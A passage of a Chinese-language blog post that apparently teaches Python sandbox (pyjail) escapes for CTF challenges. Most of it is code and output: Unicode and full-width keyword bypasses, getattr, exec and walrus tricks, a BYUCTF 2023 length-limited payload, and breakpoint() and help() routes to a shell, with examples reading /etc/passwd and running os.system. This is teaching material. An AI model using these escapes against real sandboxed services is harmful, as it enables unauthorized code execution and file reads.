        elif 0x21 &lt;= code &lt;= 0x7E:  # 可打印ASCII字符 → 全角字符
            result.append(chr(code + 0xFEE0))
        else:  # 其他字符保持不变
            result.append(char)
    return &#x27;&#x27;.join(result)

# 目标字符串
target_string = &quot;eval&quot;

# 转换并直接打印结果
print(halfwidth_to_fullwidth(target_string))</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703093113593.png" alt="image-20250703093113593"></p>
<p>可以看到绕过成功</p>
<p>还有一种方法也可以绕过，利用特殊的Unicode字符</p>
<pre><code class="highlight plaintext">𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗
𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻 
𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡</code></pre>
<pre><code class="highlight plaintext">#coding=utf-8
def convert_to_math_sans_italic(text):
    result = []
    for char in text:
        code = ord(char)
        if 0x30 &lt;= code &lt;= 0x39:
            result.append(chr(code - 0x30 + 0x1D7EC))
        elif 0x61 &lt;= code &lt;= 0x7A:
            result.append(chr(code - 0x61 + 0x1D622))
        elif 0x41 &lt;= code &lt;= 0x5A:
            result.append(chr(code - 0x41 + 0x1D608))
        else:
            result.append(char)
    return &#x27;&#x27;.join(result)

if __name__ == &quot;__main__&quot;:
    original = &quot;eval&quot;
    converted = convert_to_math_sans_italic(original)
    print(&quot;原始字符串:&quot;, original)
    print(&quot;转换结果: &quot;, converted)</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703094342023.png" alt="image-20250703094342023"></p>
<p>可以看到也绕过成功了</p>
<p>但是要注意的是放在语句中时绝对不能用全角字符作开头，会褒姒</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703094649462.png" alt="image-20250703094649462"></p>
<h4 id="过滤属性"><a class="markdownIt-Anchor" href="#过滤属性"></a> 过滤属性</h4>
<p>利用一下<code>getattr</code>这个函数</p>
<p>功能其实就是获取类的某个属性值</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; getattr(os,&#x27;system&#x27;)(&#x27;cat /etc/passwd&#x27;)
root:x:0:0:root:/root:/usr/bin/zsh</code></pre>
<p>也可以用<code>__getattribute__</code>方法替换</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; os.__getattribute__(&#x27;system&#x27;)
&lt;built-in function system&gt;</code></pre>
<p>还可以用<code>__getattr</code>__</p>
<pre><code class="highlight plaintext">这是一个魔术方法</code></pre>
<h4 id="行数限制"><a class="markdownIt-Anchor" href="#行数限制"></a> 行数限制</h4>
<p>绕过多行限制的利用手法通常在限制了单行代码的情况下使用,例如 eval, 中间如果存在；或者换行会报错。</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(&quot;__import__(&#x27;os&#x27;);print(1)&quot;)
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
  File &quot;&lt;string&gt;&quot;, line 1
    __import__(&#x27;os&#x27;);print(1)</code></pre>
<h5 id="exec"><a class="markdownIt-Anchor" href="#exec"></a> exec</h5>
<p>exec 可以支持换行符与<code>;</code></p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(&quot;exec(&#x27;__import__(\&quot;os\&quot;)\\nprint(1)&#x27;)&quot;)
1</code></pre>
<h5 id="compile"><a class="markdownIt-Anchor" href="#compile"></a> compile</h5>
<p>compile 在 single 模式下也同样可以使用 \n 进行换行, 在 exec 模式下可以直接执行多行代码.</p>
<pre><code class="highlight plaintext">eval(&#x27;&#x27;&#x27;eval(compile(&#x27;print(&quot;hello world&quot;); print(&quot;heyy&quot;)&#x27;, &#x27;&lt;stdin&gt;&#x27;, &#x27;exec&#x27;))&#x27;&#x27;&#x27;)</code></pre>
<h5 id="海象表达式"><a class="markdownIt-Anchor" href="#海象表达式"></a> 海象表达式</h5>
<p>海象表达式是 Python 3.8 引入的一种新的语法特性，用于在表达式中同时进行赋值和比较操作。</p>
<p>海象表达式的语法形式如下：</p>
<pre><code class="highlight plaintext">&lt;expression&gt; := &lt;value&gt; if &lt;condition&gt; else &lt;value&gt;</code></pre>
<p>借助海象表达式，我们可以通过列表来替代多行代码：</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(&#x27;[a:=__import__(&quot;os&quot;),b:=a.system(&quot;id&quot;)]&#x27;)
uid=1000(kali) gid=0(root) groups=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),122(bluetooth),134(scanner),142(kaboxer)
[&lt;module &#x27;os&#x27; (frozen)&gt;, 0]</code></pre>
<h4 id="长度限制"><a class="markdownIt-Anchor" href="#长度限制"></a> 长度限制</h4>
<p>BYUCTF_2023 中的几道 jail 题对 payload 的长度作了限制</p>
<pre><code class="highlight plaintext">eval((__import__(&quot;re&quot;).sub(r&#x27;[a-z0-9]&#x27;,&#x27;&#x27;,input(&quot;code &gt; &quot;).lower()))[:130])</code></pre>
<p>题目限制不能出现数字字母，构造的目标是调用 open 函数进行读取</p>
<pre><code class="highlight plaintext">print(open(bytes([102,108,97,103,46,116,120,116])).read())</code></pre>
<p>函数名比较好绕过，直接使用 unicode。数字也可以使用 ord 来获取然后进行相减。我这里选择的是 chr(333).</p>
<pre><code class="highlight plaintext"># f = 102 = 333-231 = ord(&#x27;ō&#x27;)-ord(&#x27;ç&#x27;)
# a = 108 = 333-225 = ord(&#x27;ō&#x27;)-ord(&#x27;á&#x27;)
# l = 97 = 333-236 = ord(&#x27;ō&#x27;)-ord(&#x27;ì&#x27;)
# g = 103 = 333-230 = ord(&#x27;ō&#x27;)-ord(&#x27;æ&#x27;)
# . = 46 = 333-287 = ord(&#x27;ō&#x27;)-ord(&#x27;ğ&#x27;)
# t = 116 = 333-217 = ord(&#x27;ō&#x27;)-ord(&#x27;Ù&#x27;)
# x = 120 = = 333-213 = ord(&#x27;ō&#x27;)-ord(&#x27;Õ&#x27;)

print(open(bytes([ord(&#x27;ō&#x27;)-ord(&#x27;ç&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;á&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;ì&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;æ&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;ğ&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;Ù&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;Õ&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;Ù&#x27;)])).read())</code></pre>
<p>但这样的话其实长度超出了限制。而题目的 eval 表示不支持分号 ;，这种情况下，我们可以添加一个 exec。然后将 ord 以及不变的 <code>a('ō')</code> 进行替换。这样就可以构造一个满足条件的 payload</p>
<pre><code class="highlight plaintext">exec(&quot;a=ord;b=a(&#x27;ō&#x27;);print(open(bytes([b-a(&#x27;ç&#x27;),b-a(&#x27;á&#x27;),b-a(&#x27;ì&#x27;),b-a(&#x27;æ&#x27;),b-a(&#x27;ğ&#x27;),b-a(&#x27;Ù&#x27;),b-a(&#x27;Õ&#x27;),b-a(&#x27;Ù&#x27;)])).read())&quot;)</code></pre>
<p>但其实尝试之后发现这个 payload 会报错，原因在于其中的某些 unicode 字符遇到 lower() 时会发生变化，避免 lower 产生干扰，可以在选取 unicode 时选择 ord 值更大的字符。例如 chr(4434)</p>
<p>当然，可以直接使用 input 函数来绕过长度限制。</p>
<h5 id="打开-input-输入"><a class="markdownIt-Anchor" href="#打开-input-输入"></a> 打开 input 输入</h5>
<p>如果沙箱内执行的内容是通过 input 进行传入的话（不是 web 传参），我们其实可以传入一个 input 打开一个新的输入流，然后再输入最终的 payload，这样就可以绕过所有的防护。</p>
<p>以 BYUCTF2023 jail a-z0-9 为例：</p>
<pre><code class="highlight plaintext">eval((__import__(&quot;re&quot;).sub(r&#x27;[a-z0-9]&#x27;,&#x27;&#x27;,input(&quot;code &gt; &quot;).lower()))[:130])</code></pre>
<p>即使限制了字母数字以及长度，我们可以直接传入下面的 payload（注意是 unicode）</p>
<pre><code class="highlight plaintext">𝘦𝘷𝘢𝘭(𝘪𝘯𝘱𝘶𝘵())</code></pre>
<p>这段 payload 打开 input 输入后，我们再输入最终的 payload 就可以正常执行。</p>
<pre><code class="highlight plaintext">__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</code></pre>
<p>打开输入流需要依赖 input 函数，no builtins 的环境中或者题目需要以 http 请求的方式进行输入时，这种方法就无法使用了。</p>
<p>下面是一些打开输入流的方式:</p>
<ul>
<li><strong>sys.stdin.read()</strong></li>
</ul>
<p>注意输入完毕之后按 ctrl+d 结束输入</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(sys.stdin.read())
__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)
kali
0
&gt;&gt;&gt;</code></pre>
<ul>
<li><strong>sys.stdin.readline()</strong></li>
</ul>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(sys.stdin.readline())
__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</code></pre>
<ul>
<li><strong>sys.stdin.readlines()</strong></li>
</ul>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(sys.stdin.readlines()[0])
__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</code></pre>
<p>在 python2 中，在python 2中，input 函数从标准输入接收输入之后会自动 eval 求值。因此无需在前面加上 eval。但 raw_input 不会自动 eval。</p>
<h5 id="breakpoint-函数"><a class="markdownIt-Anchor" href="#breakpoint-函数"></a> breakpoint 函数</h5>
<p>pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。</p>
<p>在输入 breakpoint() 后可以代开 Pdb 代码调试器，在其中就可以执行任意 python 代码</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; 𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()
--Return--
&gt; &lt;stdin&gt;(1)&lt;module&gt;()-&gt;None
(Pdb) __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)
a-z0-9.py  exp2.py  exp.py  flag.txt
0
(Pdb) __import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)
$ ls
a-z0-9.py  exp2.py  exp.py  flag.txt</code></pre>
<h5 id="help-函数"><a class="markdownIt-Anchor" href="#help-函数"></a> help 函数</h5>
<p>help 函数可以打开帮助文档. 索引到 os 模块之后可以打开 sh</p>
<p>当我们输入 help 时，注意要进行 unicode 编码，help 函数会打开帮助</p>
<pre><code class="highlight plaintext">𝘩𝘦𝘭𝘱()</code></pre>
<p>然后输入 os,此时会进入 os 的帮助文档。</p>
<pre><code class="highlight plaintext">help&gt; os</code></pre>
<p>然后在输入 <code>!sh</code> 就可以拿到 /bin/sh, 输入 <code>!bash</code> 则可以拿到 /bin/bash</p>
<pre><code class="highlight plaintext">help&gt; os
$ ls
a-z0-9.py  exp2.py  exp.py  flag.txt
$</code></pre>
<h2 id="vm逃逸"><a class="markdownIt-Anchor" href="#vm逃逸"></a> vm逃逸</h2>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>请我一杯咖啡吧！</div>
  <button>
    赞赏
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.jpg" alt="AyaN0 微信">
        <span>微信</span>
      </div>

  </div>
</div>

          <div class="post-tags">
              <a href="/tags/Web/" rel="tag"># -Web</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/04/28/%E5%88%9D%E8%A7%81XXE/" rel="prev" title="初见XXE">
                  <i class="fa fa-angle-left"></i> 初见XXE
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/05/08/%E4%B8%80%E4%B8%AA%E9%A3%9E%E8%88%9E%E7%9A%84%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/" rel="next" title="一个飞舞的渗透学习实录">
                  一个飞舞的渗透学习实录 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">AyaN0</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">335k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">10:08</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
